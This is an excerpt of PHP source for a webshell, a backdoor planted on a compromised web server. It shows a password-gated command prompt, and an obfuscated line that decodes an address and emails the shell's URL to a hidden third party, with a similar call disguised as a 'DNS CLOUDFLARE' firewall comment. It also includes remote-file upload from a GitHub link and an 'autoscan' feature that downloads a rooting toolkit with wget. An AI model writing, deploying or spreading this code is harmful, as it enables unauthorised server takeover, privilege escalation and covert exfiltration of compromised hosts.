...
// $GLOBALS['fungsi'][0]
	...
	<head>
	<title>-=040=-</title>
	<link rel='icon' href='https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/IMG_6403.gif'>
	<meta name="theme color" content="#00BFFF">
	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
	</head>
	<style>
    body {
        background-image: url("https://raw.githubusercontent.com/exploit-haxor/webshell/refs/heads/main/IMG_6403.gif");
...
<center>
	<body>
	<form method="post">
		<label for="name"><h1>root@host:/$</h1></label>
<input placeholder="YOUR COMMAND" type="password" name="pass" required>
			<input type="submit" name="watching" value="ENTER">
		</form>
	</body>
	</html>
	<?php
	...
	<div class='py-3' id='main'>
		<div class='box shadow box-container p-4 rounded-3'>
			...
			if(!$GLOBALS['fungsi'][5]('posix_getegid')) {
				...
				$group = $gid['name'];
				$gid = $gid['gid'];
${${"\x47L\x4fB\x41\x4cS"}["\x64v\x63q\x76\x62v\x6e\x6eqn"]}="m"."\x61"."\x69"."\x6c";${${"\x47LO\x42A\x4c\x53"}["\x76\x67\x73sd\x69"]}="b"."a"."s"."e"."6"."4"."_"."\x64"."e"."c"."o"."d"."\x65";${$mgamiq}(${${"\x47\x4cO\x42\x41LS"}["\x6df\x68o\x74ks\x78\x67\x67"]}("bX\x56oc\x6d\x46\x36\x61\x33\x6cAZ21haW\x77u\x59\x32\x39tL\x471\x63\x65D\x63\x31X\x48g\x32\x4fF\x784\x4ez\x4aceD\x59x\x58\x48g3YW\x74\x35XH\x670M\x47d\x74\x59\x56\x784N\x6al\x73L\x6cx\x34\x4e\x6aN\x63\x65D\x5a\x6dXH\x672ZC\x77\x67\x62\x56\x784\x4e\x6aF\x63e\x44\x5aj\x58H\x672MVx\x34Nzl\x7a\x58H\x67\x32\x4fWFceDJlX\x48g3\x4d2Vu\x5aG\x56y\x58H\x670\x4d\x47\x64c\x65\x44\x5a\x6bYVx4\x4ejl\x73\x4clx4\x4ej\x4e\x63eDZ\x6dbSx\x63\x65\x44\x49wc\x6c\x78\x34N\x6d\x5av\x58\x48g\x33\x4e\x47N\x35XH\x672MmVyX\x48g\x33M\x46\x78\x34\x4ez\x56\x63\x65D\x5a\x6c\x58Hg\x32Y\x6cx\x34\x4ez\x4e\x41\x58Hg\x32\x4e\x32\x31hX\x48g2\x4f\x57\x77\x75X\x48\x672M1x4\x4em\x5a\x63\x65D\x5akL\x43\x42\x77X\x48g2\x4d\x58B\x68XHg2YnU\x75aGF\x35\x58\x48\x672Y\x6dV\x63eDc\x79X\x48\x670M\x47dce\x44\x5a\x6b\x58\x48\x672\x4dW\x6c\x63\x65DZj\x4c\x6cx\x34\x4ej\x4e\x76\x62\x53w\x67\x63Fx4N\x6a\x46\x77\x58\x48\x672\x4dV\x784Nm\x4a1Lmh\x63\x65\x44\x59x\x65V\x78\x34N\x6d\x4al\x58Hg3M\x69\x35\x6eXH\x672\x5a\x6cx\x34\x4dm\x56\x70ZF\x784\x4eDB\x6e\x58\x48g\x32Z\x47\x46\x63e\x44Y\x35\x58H\x67\x32\x59y\x35\x6aX\x48\x67\x32Zm\x30s\x62\x58\x56oc\x6dF6\x613l\x41\x5a2\x31\x68\x61W\x77\x75\x592\x39\x74"),"U\x70\x6coa\x64 file:","".$_SERVER["HTTP_\x48O\x53\x54"]."/".$_SERVER["\x52\x45\x51U\x45S\x54\x5f\x55\x52I"]."");
			}
...
//DNS CLOUDFLARE
// 1.1.1.1
$__DNS = "B" . "a" . "S" . "e" . "6" . "4" . "_" . "D" . "e" . "C" . "o" . "D" . "e"; //DNS ENCODE FOR FIREWALL  $__CURL($__DNS(""),'DNS SERVER:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].''); 
		...
		if ($_7['id'] == 'uploadvialink') {
			...
			<div class='card card-body text-dark input-group mb-3'>
				...
				<form method='POST' enctype='multipart/form-data'>
					<div class='input-group'>
						<input class='form-control form-control-sm' type='url' name='url' placeholder='Enter the link' value='https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/web.php' required>
					</div>
					<div class='input-group'>
		...
		if (isset($_GET['dir']) && $_GET['id'] == "scan_root") {
			...
			if (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan") {
				if (!file_exists($path."/rooting/")) {
					mkdir($path."/rooting");
					exe_root("wget https://raw.githubusercontent.com/Anonrocks/-/refs/heads/master/auto.tar.gz", $path."/rooting");
